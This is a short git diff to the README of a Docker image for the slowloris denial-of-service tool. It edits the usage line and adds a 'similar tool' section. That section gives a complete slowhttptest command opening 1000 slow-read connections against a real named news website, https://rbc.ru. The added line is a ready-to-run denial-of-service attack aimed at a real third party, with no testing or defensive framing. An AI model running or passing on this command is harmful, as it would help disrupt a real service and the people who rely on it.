@@ -29,5 +29,11 @@ https://github.com/gkbrk/slowloris
 
 Example command:  
 ```
-docker run --rm -it aminvakil/slowloris [-h] [-u URL] [-s numberOfSockets]
+docker run --rm -it aminvakil/slowloris [-h] [-u DOMAIN] [-s numberOfSockets]
+```
+
+# Another awesome similar to slowloris tool 
+
+```
+docker run --rm -it shekyan/slowhttptest:latest -c 1000 -X -g -o slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://rbc.ru -p 3 
 ```
